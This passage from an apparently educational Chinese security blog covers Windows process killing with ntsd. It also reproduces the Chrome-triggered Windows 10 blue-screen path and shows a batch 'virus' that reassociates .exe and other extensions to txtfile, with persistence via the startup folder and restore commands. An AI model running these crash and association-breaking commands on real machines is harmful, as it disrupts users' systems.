ntsd 从 Windows 2000 开始就是系统自带的进程调试工具，在 system32 目录下。ntsd 的功能非常的强大，用法也比较复杂，但如果只用来结束一些进程，那就比较简单了。在 Windows 中只有 System、SMSS.EXE 和 CSRSS.EXE 不能杀。前两个是纯内核态的，最后那个是 Win32 子系统，ntsd 本身需要它。lsass.exe 也不要杀掉，它是负责本地账户安全的。被调试器附着的进程会随调试器一起退出，所以可以用来在命令行下终止进程。

打开 cmd 后输入以下命令就可以结束进程：

*   方法一：利用进程的 PID 结束进程  
    命令格式：ntsd -c q -p pid  
    命令范例：ntsd -c q -p 1332 （结束 explorer.exe 进程）
    

范例详解：explorer.exe 的 pid 为 1332，但是如何获取进程的 pid 呢？在 CMD 下输入 TASKLIST 就可以获取当前任务管理器所有进程的 PID。或者打开任务管理器，在菜单栏，选择 “查看”->“选择列”，在打开的选择项窗口中将“PID（进程标识符）” 项选择钩上，这样任务管理器的进程中就会多出 PID 一项了。PID 的分配并不固定，是在进程启动是由系统随机分配的，所以进程每次启动的进程一般都不会一样。

*   方法二：利用进程名结束进程  
    命令格式：ntsd -c q -pn xxxx.exe （xxxx.exe 为进程名，exe 不能省）  
    命令范例：ntsd -c q -pn explorer.exe
    

另外的能结束进程的 DOS 命令还有 taskkill 和 tskill 命令。

2. 最新漏洞 Chrome 致 Win10 蓝屏复现
---------------------------

接着补充一个 2021 年初大家会遇到的 Chrome 浏览器导致 Win10 蓝屏的漏洞。

第一步，在 Win10 谷歌浏览器（建议使用虚拟机测试）中输入命令。

```
\\.\globalroot\device\condrv\kernelconnect
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aT3kzicbIKc1sD1udiaZyh1KMF1tECSgMw3vNfSSIjfZQBKYbmTI6AqSvw/640?wx_fmt=png)

第二步，我们的计算机就会自动蓝屏重启。  
该漏洞请勿轻易测试，个人虚拟机测试前先保存好资料。漏洞可用于拒绝服务攻击，并且微软还未修复该漏洞，微软 edge 浏览器也具有相同的效果。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTqFibbwNIYKm7OGRmGe0ia6aEvYu6TZDhYVVkpPlBPshfLVkuWO7lDicXw/640?wx_fmt=png)

第三步，分析漏洞原因，参考 bleepingcomputer 网站。

*   www.bleepingcomputer.com
    

该 Windows 10 中的错误是通过在浏览器的地址栏中打开特定路径或使用其他 Windows 命令，即可使操作系统崩溃并显示蓝屏死机。据 BleepingComputer 了解，这是 Windows 安全研究人员在 Twitter 上披露的两个错误，攻击者可以在各种攻击中滥用这些错误。

*   第一个错误允许无特权的用户或程序输入单个命令，该命令会导致 NTFS 卷被标记为已损坏。该测试表明该命令导致硬盘驱动器损坏，从而导致 Windows 无法启动。
    
*   第二个漏洞是 Windows 10 通过尝试打开一条异常路径而导致 BSOD（Blue Screen of Death，蓝屏死机）崩溃，致使电脑蓝屏。
    

自去年 10 月以来，Windows 安全研究员 Jonas Lykkegaard 已经多次在推特上发布了一个路径，当输入到 Chrome 浏览器地址栏时，该路径会立即导致 Windows 10 崩溃并显示 BSOD（蓝屏死机）。

当开发人员想要直接与 Windows 设备进行交互时，他们可以将 Win32 设备命名空间路径作为参数传递给 Windows 编程函数。例如，允许应用程序直接与物理磁盘进行交互，而无需通过文件系统。Lykkegaard 告诉 BleepingComputer，他发现了以下 “控制台多路复用器驱动程序” 的 Win32 设备命名空间路径，他认为该路径用于 “内核 / 用户模式 ipc”。当以各种方式打开该路径时，即使是低权限用户，也会导致 Windows 10 崩溃。

```
\\.\globalroot\device\condrv\kernelconnect
```

当连接到该设备时，开发人员应传递 “attach” 扩展属性以与该设备正确通信。如果你试图在没有传递属性的情况下由于错误检查不当而连接到该路径，它将导致一个异常，最终导致 Win10 出现 BSOD 崩溃。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTduFCBosMk8hJib1LxVIzXABicsgibWPAYInZgPbNG7ianofLaIROQnIM9Q/640?wx_fmt=png)

更糟糕的是，特权低的 Windows 用户可以尝试使用此路径连接到设备，从而使计算机上执行的任何程序都很容易让 Windows 10 崩溃。在测试中，已经确认此错误在 Windows 10 1709 版及以后的版本中存在。

五. 简单扩展名修改恶意攻击
==============

将文件格式修改或文档加密都是常见的病毒，比如永恒之蓝、勒索病毒等，它们就是将电脑内的所有资料、文档加密，当你要打开文件时，需要密码，此时通过比特币付费进行勒索。

下面这个小操作是将 exe 文件修改为 txt 文档。当遇到可执行的 exe 文件，会认为它是一个 txt 文档，用记事本打开，导致可执行程序运行不起来，这是就是这个病毒的原理。

*   新建文本文档
    
*   增加代码：assoc.exe=txtfile
    
*   txt 修改为 bat
    
*   开始 -> 程序 -> 启动，打开 bat 文件
    

双击运行 bat 文件之后，我们的可执行文件就变成了 txt 文件。此时系统认为 exe 就是 txt 程序，把系统的关联搞混乱了，它恢复起来很麻烦。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aT9yqVqysDwwkKYOWMRogK0QlfzEjKUoM16l3IsQZor5EMbBVzy8Rybg/640?wx_fmt=png)

EXE 程序打开如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTUsDqBoUYs78UP2RHibyfT710SRnDcribG6YWDpdcLCIPluLIOo0TdxBw/640?wx_fmt=png)

甚至打开 CMD 都是 TXT 文本文件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTxAKqNtofGHD6tt4CvYQKdjJUPQJiaUhvOI3XVFU9MVibAWM6kHXlGehg/640?wx_fmt=png)

接着需要执行下面的命令还原 exe 文件。

*   assoc.exe=exefile
    

还原的代码及效果如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aThzv8iaib5eG7JvVChexJBWQqD9Jc6tulDMIBjKaTZcJuicdR5nPylHdDw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTyymnSlD6OGxsNm3Z6cb920gKJR2ibFBFCjfvqZic4wiaUjNQnrYaRdwuQ/640?wx_fmt=png)

其他所有文件格式都转换为 txt 文件，如下所示。此时，如果隐藏文件扩展名，甚至可以修改图标伪装成目标应用，当用户点击时会执行这些破坏；但由于不知道目标是否有隐藏文件扩展名，还是不建议这种 “笨” 方法。

```
assoc .htm=txtfileassoc .dat=txtfileassoc .com=txtfileassoc .rar=txtfileassoc .gho=txtfileassoc .mvb=txtfile...
```

解决方法：  
如果您不幸中了该病毒，怎么解决呢？如下图所示，还原所有正确关联即可。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTMlIEug4FibkhDlJgOPPzPh79eE9VUBHkwBDsQYWw4F5nQ0hHkfkHMCw/640?wx_fmt=png)

当然，还有一些恶意或娱乐功能，比如 VBS 脚本、网页弹窗（网站钓鱼）等，这里不再讲解。如果把病毒程序放到启动项，每次开机都会自动执行。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTicth0BHJTrrdSlSF7NPIcsd4t92V4L0z4mtiaRibqIoTqpMNV7tvoXC5A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aT84YV5iaUL1x3xK0ibU7vLc7fG1AkaWd8icmhEiamRHAic3XC3QBoOAodlkQ/640?wx_fmt=png)

六. 总结
=====

写到这里，这篇文章就介绍结束了，希望对您有所帮助，尤其是想成为白帽子和安全防御人员，这些基础知识都将对你系统安全入门有一定作用。再次感谢参考文献的各位大佬，也推荐大家阅读参考文献的文章和视频。文章存在一些不足，作者没有深入理解其原理，也是作为网络安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。

*   **一. 批处理病毒机理**
    
    1. 关机 bat 脚本
    
    2. 修改密码和定时关机脚本
    
    3. 脚本病毒防御
    
*   **二. 自启动恶意攻击机理**
    
    1.bat 脚本实现自启动
    
    2.WinRAR 恶意劫持自启动（CVE-2018-20250）
    
    3. 恶意自启动防御
    
*   **三. 进程关闭脚本**
    
*   **四. 蓝屏攻击机理**
    
    1.bat 脚本实现蓝屏攻击
    
    2. 最新漏洞 Chrome 致 Win10 蓝屏复现
    
    3. 关键技术
    
*   **五. 简单的扩展名修改恶意攻击**
    

学安全一年，认识了很多安全大佬和朋友，希望大家一起进步。这篇文章中如果存在一些不足，还请海涵。作者作为网络安全和系统安全初学者的慢慢成长路吧！希望未来能更透彻撰写相关文章。同时非常感谢参考文献中的安全大佬们的文章分享，感谢师傅、实验室小伙伴的教导，深知自己很菜，得努力前行。编程没有捷径，逆向也没有捷径，它们都是搬砖活，少琢磨技巧，干就对了。什么时候你把攻击对手按在地上摩擦，你就赢了，也会慢慢形成了自己的安全经验和技巧。加油吧，少年希望这个路线对你有所帮助，共勉。

前文回顾（下面的超链接可以点击喔）：

*   [[系统安全] 一. 什么是逆向分析、逆向分析应用及经典扫雷游戏逆向](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484670&idx=1&sn=c31b15b73f27a7ce44ae1350e7f708a2&chksm=cfccb433f8bb3d25c25f044caac29d358fe686602011d8e4cbdc504e3a587e756215ce051819&scene=21#wechat_redirect)
    
*   [[系统安全] 二. 如何学好逆向分析及吕布传游戏逆向案例](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484756&idx=1&sn=ef95ff95474c51fa2bd4b9b4847ebb54&chksm=cfccb599f8bb3c8fa4852416cff6695fc8dcc9aadb3295c7249c12c03cad4c146a93e6250d56&scene=21#wechat_redirect)
    
*   [[系统安全] 三. IDA Pro 反汇编工具初识及逆向工程解密实战](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484812&idx=1&sn=9b77853a5b9da0f7a688e592dba3ddba&chksm=cfccb541f8bb3c57faffc7661a452238debe09cc7a57ae2d9e9d835d6520ee441bfd9d5ad119&scene=21#wechat_redirect)
    
*   [[系统安全] 四. OllyDbg 动态分析工具基础用法及 Crakeme 逆向破解](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247484950&idx=1&sn=07d8f0b20f599586ef06035354b14630&chksm=cfccb6dbf8bb3fcd6d2efcc7b6757fabd8015d86f43e3bc8ae6cb9367d19492aec881374fca2&scene=21#wechat_redirect)
    
*   [[系统安全] 五. OllyDbg 和 Cheat Engine 工具逆向分析植物大战僵尸游戏](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485043&idx=1&sn=028c702990f722d087c6c349fb34f5fb&chksm=cfccb6bef8bb3fa8882994f7412db6b769d382abbafa6b5b3bd1b5ae62dffa20e81c7170ecb4&scene=21#wechat_redirect)
    
*   [[系统安全] 六. 逆向分析之条件语句和循环语句源码还原及流程控制](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485936&idx=1&sn=b1c282021280bb24646a9bf7c0f1fa6a&chksm=cfccb93df8bb302b51ae1026dba4f8839a1c68690df0e8da3242e9c1ead0182bf6c34dd44ada&scene=21#wechat_redirect)
    
*   [[系统安全] 七. 逆向分析之 PE 病毒原理、C++ 实现文件加解密及 OllyDbg 逆向](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247485996&idx=1&sn=d5e323f16ce0b3d88c678a1fc1848596&chksm=cfccbae1f8bb33f7fad687d17ba7c10312bf2d756e460217a5d60ef2af0c012336292918128d&scene=21#wechat_redirect)
    
*   [[系统安全] 八. Windows 漏洞利用之 CVE-2019-0708 复现及蓝屏攻击](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486024&idx=1&sn=102ace20c2b15f4e7a9f910b56b84aec&chksm=cfccba85f8bb33939ac7e99cae23d1b6da5a0db4e6ff8bc7535a77a46a4204855de41aa446dd&scene=21#wechat_redirect)
    
*   [[系统安全] 九. Windows 漏洞利用之 MS08-067 远程代码执行漏洞复现及深度提权](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486057&idx=1&sn=7e7899b9285ac04f0d9745b4c455b005&chksm=cfccbaa4f8bb33b25ffcd780764ad86dc63edc7dd56d09e466254f6277851b5a4a545bb209a4&scene=21#wechat_redirect)
    
*   [[系统安全] 十. Windows 漏洞利用之 SMBv3 服务远程代码执行漏洞（CVE-2020-0796）复现](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486111&idx=1&sn=e2129fc8efa79d2356c3a2deec6d52a1&chksm=cfccba52f8bb3344479fa8d201494f88ac1b0cee3e0786797dd09a17c5f4aa4a5627fd0afef0&scene=21#wechat_redirect)
    
*   [[系统安全] 十一. 那些年的熊猫烧香及 PE 病毒行为机理分析](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486188&idx=1&sn=34a1d3f2d6880dfd60917b84d3efaa5a&chksm=cfccba21f8bb3337b45cc0fb98af3ab6a1333219fe2a06d3c3c8e38b996e1039e5b0f8d14f24&scene=21#wechat_redirect)
    
*   [[系统安全] 十二. 熊猫烧香病毒 IDA 和 OD 逆向分析（上）病毒初始化](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486260&idx=1&sn=0760360d286782209e9f93d37c177c73&chksm=cfccbbf9f8bb32ef5e54058ded6072a248e3156be64213a238b47b5fa65b6909889ab0c9b7c5&scene=21#wechat_redirect)
    
*   [[系统安全] 十三. 熊猫烧香病毒 IDA 和 OD 逆向分析（中）病毒释放机理](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486423&idx=1&sn=43f77342f8900b481eaa536b9e81f737&chksm=cfccbb1af8bb320ccc6f1bd93e358b916ccb6313f9bbdcf1d9c31deebf16a2e643ce0e121113&scene=21#wechat_redirect)
    
*   [[系统安全] 十四. 熊猫烧香病毒 IDA 和 OD 逆向分析（下）病毒感染配置](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486580&idx=1&sn=20b672097bf0be1fbdf5952bb53b23a6&chksm=cfccbcb9f8bb35affbc611fc92875f9250060914d94fa1d9a7c2b9e9482fd4a50bbb33ebc42f&scene=21#wechat_redirect)
    
*   [[系统安全] 十五. Chrome 密码保存功能渗透解析、Chrome 蓝屏漏洞及音乐软件漏洞复现](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486662&idx=1&sn=6506a733804564137d40c7c070287590&chksm=cfccbc0bf8bb351d1a82737e5dc310c048f80fb5fcfe3317c7bc1b38ac6b52de60923cb92ba7&scene=21#wechat_redirect)
    
*   [[系统安全] 十六. PE 文件逆向基础知识 (PE 解析、PE 编辑工具和 PE 修改)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247486866&idx=1&sn=cd3bc433c0a6a7b1f8bcaa4295cf65ae&chksm=cfccbd5ff8bb34496b9dc20b2fd304ce1d1194fd076902127a6817362b3c52afc056126ca0ba&scene=21#wechat_redirect)
    
*   [[系统安全] 十七. Windows PE 病毒概念、分类及感染方式详解](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247487219&idx=1&sn=1e123c330cb0499400d5529cbd5f47f3&chksm=cfccbe3ef8bb3728118a0aab982a56b3ea66f320a221c6a318263104a35f5aee8d3545612683&scene=21#wechat_redirect)
    
*   [系统安全] 十八. 病毒攻防机理及 WinRAR 恶意劫持漏洞 (bat 病毒、自启动、蓝屏攻击)  
    

2020 年 8 月 18 新开的 “娜璋 AI 安全之家”，主要围绕 Python 大数据分析、网络空间安全、人工智能、Web 渗透及攻防技术进行讲解，同时分享 CCF、SCI、南核北核论文的算法实现。娜璋之家会更加系统，并重构作者的所有文章，从零讲解 Python 和安全，写了近十年文章，真心想把自己所学所感所做分享出来，还请各位多多指教，真诚邀请您的关注！谢谢。2021 年继续加油！

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZePZ27y7oibNu4BGibRAq4HydK4JWeQXtQMKibpFEkxNKClkDoicWRC06FHBp99ePyoKPGkOdPDezhg/640?wx_fmt=png)

(By:Eastmount 2021-02-03 周三夜于 1 点)

*   参考文献：  
    [1] 2019 黑客入门基础 Windows 网络安全精讲 - B 站千峰教育史密斯老师  
    https://www.bilibili.com/video/av75069584  
    [2] https://github.com/eastmountyxz/NetworkSecuritySelf-study  
    [3] [网络安全自学篇] 二十五. Web 安全学习路线及木马、病毒和防御初探  
    [4] https://www.bilibili.com/video/av60018118 (B 站白帽黑客教程)  
    [5] https://www.bilibili.com/video/av63038037 (B 站 HACK 学习)  
    [6] https://www.bilibili.com/video/av68215785 (2019 网络安全 / 黑客基础课程新手入门必看)